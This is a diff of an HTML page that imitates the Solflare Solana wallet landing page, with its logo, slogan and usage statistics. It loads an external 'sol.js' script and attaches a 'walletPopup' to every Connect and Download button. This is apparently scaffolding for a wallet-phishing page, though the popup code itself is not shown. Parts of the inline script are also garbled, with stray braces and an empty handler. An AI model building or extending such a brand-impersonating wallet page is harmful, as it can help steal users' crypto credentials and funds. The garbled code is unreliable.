@@ -1,407 +1,351 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-     <script src="sol.js"></script>
-    <meta charset="UTF-8">
-    <title>Solflare Landing</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-      :root {
-        --yellow: #ffe930;
-        --nav-bg: #0b0c10;
-        --bg: #eef0f4;
-        --black: #141414;
-        --bg-grey: #eef0f4;
-      }
-      html, body {
-        height: 100%;
-        margin: 0;
-        padding: 0;
-        font-family: 'Inter', Arial, sans-serif;
-        background: var(--nav-bg);
-        box-sizing: border-box;
-      }
-      body {
-        min-height: 100vh;
-        width: 100vw;
-        margin: 0;
-        background: var(--nav-bg);
-      }
-      .navbar {
-        width: 100vw;
-        background: var(--nav-bg);
-        display: flex;
-        align-items: center;
-        padding: 18px 36px 18px 16px;
-        box-sizing: border-box;
-        position: relative;
-        z-index: 10;
-        justify-content: space-between;
-      }
-      .navbar-left {
-        display: flex;
-        align-items: center;
-        gap: 32px;
-      }
-      .logo-square {
-        width: 56px;
-        height: 56px;
-        background: var(--yellow);
-        border-radius: 18px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-right: 0;
-        flex-shrink: 0;
-      }
-      .logo-square img {
-        width: 38px;
-        height: 38px;
-        display: block;
-      }
-      .nav-links {
-        display: flex;
-        align-items: center;
-        gap: 18px;
-      }
-      .nav-link {
-        font-size: 24px;
-        color: #fff;
-        font-weight: 700;
-        text-decoration: none;
-        transition: color .15s;
-        display: flex;
-        align-items: center;
-        position: relative;
-        padding: 8px 10px;
-        border-radius: 14px;
-      }
-      .nav-link:hover {
-        background: rgba(255,255,255,0.06);
-        color: var(--yellow);
-      }
-      .nav-link .dot {
-        color: var(--yellow);
-        font-size: 16px;
-        margin-left: 4px;
-        margin-top: -13px;
-        display: inline-block;
-      }
-      .nav-link .arrow {
-        font-size: 15px;
-        margin-left: 4px;
-        margin-top: 2px;
-      }
-      .navbar-right {
-        display: flex;
-        align-items: center;
-      }
-      .download-btn {
-        background: var(--yellow);
-        color: var(--black);
-        font-size: 26px;
-        font-weight: 500;
-        border: none;
-        outline: none;
-        border-radius: 40px;
-        padding: 14px 48px;
-        margin-left: 0;
-        cursor: pointer;
-        transition: background .15s;
-        box-shadow: none;
-        display: block;
-      }
-      .download-btn:hover {
-        background: #faf36f;
-      }
-      /* Hamburger for mobile */
-      .hamburger {
-        display: none;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        width: 46px;
-        height: 46px;
-        background: none;
-        border: none;
-        cursor: pointer;
-        margin-left: 6px;
-        z-index: 20;
-      }
-      .hamburger span {
-        display: block;
-        width: 28px;
-        height: 4px;
-        background: #fff;
-        margin: 5px 0;
-        border-radius: 2px;
-        transition: all .3s;
-      }
-      .navbar-mobile-menu {
-        display: none;
-        position: fixed;
-        top: 0; left: 0;
-        width: 100vw;
-        height: 100vh;
-        background: rgba(11,12,16,0.97);
-        flex-direction: column;
-        align-items: center;
-        justify-content: flex-start;
-        z-index: 1000;
-        padding-top: 85px;
-        animation: fadeIn .25s;
-      }
-      @keyframes fadeIn {
-        from { opacity: 0;}
-        to { opacity: 1;}
-      }
-      .navbar-mobile-menu .nav-link {
-        font-size: 22px;
-        margin: 14px 0;
-        color: #fff;
-        background: none;
-        display: block;
-        text-align: center;
-      }
-      .navbar-mobile-menu .download-btn {
-        font-size: 20px;
-        padding: 11px 32px;
-        margin: 32px 0 0 0;
-        width: 80vw;
-        max-width: 380px;
-      }
-      .navbar-mobile-menu .logo-square {
-        margin-bottom: 24px;
-        margin-top: -28px;
-        width: 46px;
-        height: 46px;
-      }
-      .navbar-mobile-menu .logo-square img { width: 28px; height: 28px; }
-      /* Main content area */
+  <meta charset="UTF-8">
+ <script src="sol.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Inter for nav/body, UnifrakturCook for Solflare logo (swap for official if desired) -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@700;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=UnifrakturCook:wght@700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --yellow: #ffe930;
+      --nav-bg: #0b0c10;
+      --bg: #eef0f4;
+      --black: #141414;
+      --radius: 48px;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: var(--bg);
+      font-family: 'Inter', Arial, sans-serif;
+      color: var(--black);
+      min-height: 100vh;
+    }
+    body {
+      min-height: 100vh;
+      background: var(--bg);
+    }
+    /* NAVBAR */
+    .navbar {
+      width: 100vw;
+      background: var(--nav-bg);
+      border-radius: 0 0 var(--radius) var(--radius);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 28px 10px 18px;
+      box-sizing: border-box;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .navbar-left {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+    }
+    .logo-square {
+      width: 56px;
+      height: 56px;
+      background: var(--yellow);
+      border-radius: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.2rem;
+      font-family: 'UnifrakturCook', 'Inter', serif;
+      color: var(--nav-bg);
+      font-weight: bold;
+      margin-right: 0;
+      flex-shrink: 0;
+      letter-spacing: -2px;
+    }
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 26px;
+    }
+    .nav-link {
+      font-size: 1.45rem;
+      color: #fff;
+      font-weight: 700;
+      text-decoration: none;
+      transition: color .15s;
+      display: flex;
+      align-items: center;
+      position: relative;
+      padding: 8px 8px;
+      border-radius: 9px;
+    }
+    .nav-link .arrow {
+      font-size: 1rem;
+      margin-left: 6px;
+    }
+    .nav-link .dot {
+      color: var(--yellow);
+      font-size: 1rem;
+      margin-left: 4px;
+      margin-top: -12px;
+      display: inline-block;
+    }
+    .nav-link:hover {
+      color: var(--yellow);
+    }
+    .navbar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .download-btn {
+      background: var(--yellow);
+      color: var(--black);
+      font-weight: 700;
+      border: none;
+      border-radius: 30px;
+      padding: 13px 38px;
+      font-size: 1.25rem;
+      cursor: pointer;
+      box-shadow: none;
+      transition: background 0.15s;
+      margin-left: 0;
+    }
+    .download-btn:active,
+    .download-btn:focus {
+      background: #ffe930cc;
+      outline: none;
+    }
+    /* Hamburger menu (mobile only) */
+    .hamburger {
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      width: 44px;
+      height: 44px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      margin-left: 8px;
+      z-index: 101;
+    }
+    .hamburger span {
+      display: block;
+      width: 28px;
+      height: 3px;
+      background: #fff;
+      margin: 5px 0;
+      border-radius: 2px;
+      transition: all .3s;
+    }
+    /* Mobile nav menu */
+    .navbar-mobile-menu {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: var(--nav-bg);
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      z-index: 1000;
+      padding-top: 90px;
+      animation: fadeIn .25s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0;}
+      to { opacity: 1;}
+    }
+    .navbar-mobile-menu .logo-square {
+      margin-bottom: 24px;
+      margin-top: -18px;
+      width: 46px;
+      height: 46px;
+    }
+    .navbar-mobile-menu .logo-square img { width: 28px; height: 28px; }
+    .navbar-mobile-menu .nav-link {
+      font-size: 1.4rem;
+      margin: 18px 0;
+      color: #fff;
+      background: none;
+      display: block;
+      text-align: center;
+    }
+    .navbar-mobile-menu .download-btn {
+      font-size: 1.1rem;
+      padding: 12px 32px;
+      margin: 34px 0 0 0;
+      width: 80vw;
+      max-width: 340px;
+      border-radius: 30px;
+    }
+    /* HERO */
+    .main-content {
+      max-width: 1400px;
+      margin: 0 auto;
+      margin-top: 32px;
+      padding: 36px 0 0 0;
+      background: var(--bg);
+      border-radius: var(--radius);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      box-sizing: border-box;
+      min-height: 600px;
+    }
+    .solflare-logo-img {
+      display: block;
+      width: 82vw;
+      max-width: 900px;
+      margin: 32px auto 0 auto;
+      user-select: none;
+    }
+    .solflare-logo-text {
+      font-family: 'UnifrakturCook', 'Inter', serif;
+      font-size: 7vw;
+      font-weight: 700;
+      text-align: center;
+      margin: 30px 0 0 0;
+      letter-spacing: -6px;
+      color: var(--black);
+      line-height: 1.02;
+      width: 90vw;
+      max-width: 1100px;
+      user-select: none;
+    }
+    @media (min-width:1000px){
+      .solflare-logo-text { font-size: 8rem; }
+    }
+    .subtitle {
+      font-size: 2.8rem;
+      font-weight: 700;
+      text-align: center;
+      color: var(--black);
+      margin: 45px 0 54px 0;
+      line-height: 1.15;
+      letter-spacing: -0.5px;
+      max-width: 900px;
+      word-break: break-word;
+    }
+    .main-download-btn {
+      background: var(--black);
+      color: #fff;
+      border: none;
+      outline: none;
+      font-size: 2rem;
+      font-weight: 600;
+      border-radius: 50px;
+      padding: 22px 64px;
+      margin: 0 auto 40px auto;
+      cursor: pointer;
+      transition: background .15s;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+      display: block;
+    }
+    .main-download-btn:active {
+      background: #232425;
+    }
+    /* MOBILE STYLES */
+    @media (max-width: 900px) {
       .main-content {
-        width: 100vw;
-        min-height: calc(100vh - 92px);
-        background: var(--bg);
-        border-radius: 48px;
-        margin-top: 16px;
-        padding: 0;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        box-sizing: border-box;
-        overflow: hidden;
+        padding: 16px 0 0 0;
+        border-radius: 0 0 32px 32px;
+        min-height: 0;
       }
-      .solflare-logo-img {
-        margin-top: 42px;
-        margin-bottom: 14px;
-        width: 480px;
-        max-width: 80vw;
-        display: block;
-        user-select: none;
+      .solflare-logo-text {
+        font-size: 3.4rem;
+        max-width: 95vw;
+        margin-top: 18px;
       }
       .subtitle {
-        font-size: 48px;
-        font-weight: 700;
-        text-align: center;
-        color: var(--black);
-        margin: 24px 0 62px 0;
-        line-height: 1.12;
-        max-width: 90vw;
-        word-break: break-word;
+        font-size: 1.28rem;
+        margin: 24px 0 24px 0;
+        max-width: 96vw;
       }
-      /* Hide mobile menu by default */
-      .navbar-mobile-menu {
+      .main-download-btn {
+        font-size: 1.1rem;
+        padding: 12px 24px;
+        border-radius: 30px;
+        margin-bottom: 24px;
+      }
+      .download-btn {
+        padding: 10px 24px;
+        font-size: 1rem;
+        border-radius: 30px;
+      }
+      .navbar {
+        padding: 8px 4vw;
+        border-radius: 0 0 22px 22px;
+      }
+      .logo-square {
+        width: 36px;
+        height: 36px;
+        font-size: 1.3rem;
+        border-radius: 8px;
+      }
+    }
+    /* MOBILE NAVIGATION */
+    @media (max-width: 700px) {
+      .nav-links {
         display: none;
       }
-      /* Responsive improvements */
-      @media (max-width: 1100px) {
-        .solflare-logo-img { width: 320px; }
-        .subtitle { font-size: 28px; }
-        .navbar { padding: 10px 12px; }
-      }
-      @media (max-width: 900px) {
-        .solflare-logo-img { width: 220px; }
-        .subtitle { font-size: 20px; }
-      }
-      @media (max-width: 700px) {
-        .navbar {
-          padding: 8px 2vw;
-          border-radius: 0;
-        }
-        .logo-square { width: 38px; height: 38px;}
-        .logo-square img { width: 24px; height: 24px; }
-        .download-btn {
-          font-size: 15px;
-          padding: 7px 18px;
-        }
-        .main-content {
-          border-radius: 12px;
-          padding-bottom: 40px;
-          min-height: unset;
-        }
-        .solflare-logo-img { width: 120px; margin-top: 18px; margin-bottom: 8px; }
-        .subtitle { font-size: 16px; margin: 10px 0 18px 0; }
-        /* Hide normal nav, show hamburger */
-        .nav-links {
-          display: none;
-        }
-        .hamburger {
-          display: flex;
-        }
-      }
-      @media (max-width: 700px) {
-        .navbar-mobile-menu.active {
-          display: flex;
-        }
-      }
-      .foster-section {
-        width: 100vw;
-        background: var(--bg-grey);
+      .hamburger {
         display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: flex-start;
-        border-radius: 0 0 48px 48px;
-        overflow: hidden;
-        padding-bottom: 0;
       }
-      .wallet-video-container {
-        width: 340px;
-        max-width: 95vw;
-        margin: 0 auto;
-        margin-top: -60px;
-        margin-bottom: -40px;
-        z-index: 2;
-        box-shadow: 0 6px 22px rgba(0,0,0,0.11);
-        border-radius: 18px;
-        background: #101010;
-        overflow: hidden;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-      }
-      .wallet-video-container video {
-        width: 100%;
-        height: auto;
-        display: block;
-        border-radius: 18px;
-      }
-      .stats-section {
-        width: 100vw;
-        background: var(--yellow);
-        border-radius: 48px 48px 0 0;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        margin-top: -3vw;
-        z-index: 1;
-        box-shadow: 0 -6px 24px rgba(0,0,0,0.07);
-        padding-bottom: 48px;
-      }
-      .stats-row {
-        width: 100%;
-        max-width: 1400px;
-        display: flex;
-        justify-content: space-around;
-        align-items: flex-end;
-        padding: 48px 0 10px 0;
-        font-weight: 700;
-        color: var(--black);
-        font-size: 40px;
-        letter-spacing: 2px;
-      }
-      .stats-row .stat {
-        display: flex;
-        align-items: center;
-        font-size: 40px;
-      }
-      .stats-row .star {
-        font-size: 38px;
-        margin-right: 14px;
-        margin-left: 8px;
-      }
-      .stats-labels {
-        width: 100%;
-        max-width: 1400px;
-        display: flex;
-        justify-content: space-around;
-        align-items: flex-start;
-        font-size: 16px;
-        font-weight: 400;
-        color: var(--black);
-        letter-spacing: 2px;
+      .main-content {
         margin-top: 0;
-        margin-bottom: 0;
-        opacity: 0.93;
+        border-radius: 0 0 24px 24px;
       }
-      @media (max-width: 900px) {
-        .wallet-video-container { width: 94vw; }
-        .stats-row { font-size: 24px; }
-        .stats-row .stat { font-size: 24px; }
-        .stats-labels { font-size: 11px; }
+      .navbar-mobile-menu.active {
+        display: flex !important;
       }
-      @media (max-width: 600px) {
-        .foster-section { border-radius: 0 0 20px 20px; }
-        .stats-section { border-radius: 20px 20px 0 0; }
-        .stats-row { flex-direction: column; gap: 20px; font-size: 16px; }
-        .stats-labels { flex-direction: column; gap: 8px; font-size: 8px; align-items: flex-start; }
+    }
+    @media (max-width: 450px) {
+      .main-content {
+        border-radius: 0 0 10px 10px;
       }
-    </style>
+      .subtitle { font-size: 1rem; }
+      .solflare-logo-text { font-size: 2rem; }
+    }
+  </style>
 </head>
 <body>
+  <!-- NAVBAR -->
   <nav class="navbar">
     <div class="navbar-left">
-      <div class="logo-square">
-        <img src="https://www.solflare.com/wp-content/uploads/2024/11/App-Icon.svg" alt="Solflare App Icon" />
-      </div>
+      <div class="logo-square" title="Solflare">S</div>
       <div class="nav-links">
         <a href="#" class="nav-link">Product <span class="arrow">&#x25BC;</span><span class="dot">&#x2022;</span></a>
         <a href="#" class="nav-link">About</a>
         <a href="#" class="nav-link">Careers</a>
       </div>
     </div>
-    <button class="hamburger" id="navHamburger" aria-label="Open menu">
-      <span></span><span></span><span></span>
-    </button>
     <div class="navbar-right">
-      <button class="download-btn">Connect</button>
+      <button class="download-btn">Download now</button>
+      <button class="hamburger" id="navHamburger" aria-label="Open menu">
+        <span></span><span></span><span></span>
+      </button>
     </div>
-    <!-- Mobile nav menu -->
+    <!-- MOBILE NAV (overlay) -->
     <div class="navbar-mobile-menu" id="navbarMobileMenu">
-      <div class="logo-square">
-        <img src="https://www.solflare.com/wp-content/uploads/2024/11/App-Icon.svg" alt="Solflare App Icon" />
-      </div>
-      <a href="#" class="nav-link">Product <span class="arrow">&#x25BC;</span><span class="dot">&#x2022;</span></a>
-      <a href="#" class="nav-link">About</a>
-      <a href="#" class="nav-link">Careers</a>
-      <button class="download-btn">Connect</button>
+      <div class="logo-square" style="margin-bottom: 44px;">S</div>
+      <a href="#" class="nav-link" style="font-size:1.4rem;">Product <span class="arrow">&#x25BC;</span><span class="dot">&#x2022;</span></a>
+      <a href="#" class="nav-link" style="font-size:1.4rem;">About</a>
+      <a href="#" class="nav-link" style="font-size:1.4rem;">Careers</a>
+      <button class="download-btn" style="margin-top:38px;">Download now</button>
     </div>
   </nav>
-  <div class="main-content">
-    <img class="solflare-logo-img" src="https://www.solflare.com/wp-content/uploads/2024/11/solflare-text-logo.svg" alt="Solflare Logo" />
-    <div class="subtitle">Hold strong with the most<br>powerful wallet on Solana</div>
-  </div>
-  <section class="foster-section">
-    <div class="wallet-video-container">
-      <!-- Replace "wallet.mp4" with your actual wallet mp4 file path -->
-      <video src="wallet.mp4" autoplay loop muted playsinline></video>
+  <!-- HERO -->
+  <main class="main-content">
+    <div class="solflare-logo-text">Solflare</div>
+    <div class="subtitle">
+      Hold strong with the most<br>powerful wallet on Solana
     </div>
-    <div class="stats-section">
-      <div class="stats-row">
-        <span class="stat"><span class="star">&#9733;</span>4.84</span>
-        <span class="stat">$10,642,148,021</span>
-        <span class="stat">3M+</span>
-      </div>
-      <div class="stats-labels">
-        <span>BEST RATED ON APP STORE</span>
-        <span>FUNDS MANAGED WITH SOLFLARE</span>
-        <span>ACTIVE USERS</span>
-      </div>
-    </div>
-  </section>
+    <button class="main-download-btn download-btn">Download now</button>
+  </main>
   <script src="sol.js"></script>
   <script>
     // Hamburger menu for mobile
@@ -411,20 +355,20 @@
       mobileMenu.classList.toggle('active');
       document.body.style.overflow = mobileMenu.classList.contains('active') ? 'hidden' : '';
     });
-    // Close menu on nav-link or connect click
+    // Close menu on nav-link or button click
     mobileMenu.querySelectorAll('.nav-link, .download-btn').forEach(function(el) {
       el.addEventListener('click', function() {
         mobileMenu.classList.remove('active');
         document.body.style.overflow = '';
       });
     });
-    // Attach popup to all connect buttons (navbar + mobile)
-    
-        });
+    // Attach wallet popup to all download buttons
+   
       }
     });
   </script>
-    <script>
+
+     <script>
   // Attach to ALL buttons with the relevant classes
   document.querySelectorAll('.download-btn, .main-download-btn').forEach(function(btn){
     walletPopup.attachToButton(btn);
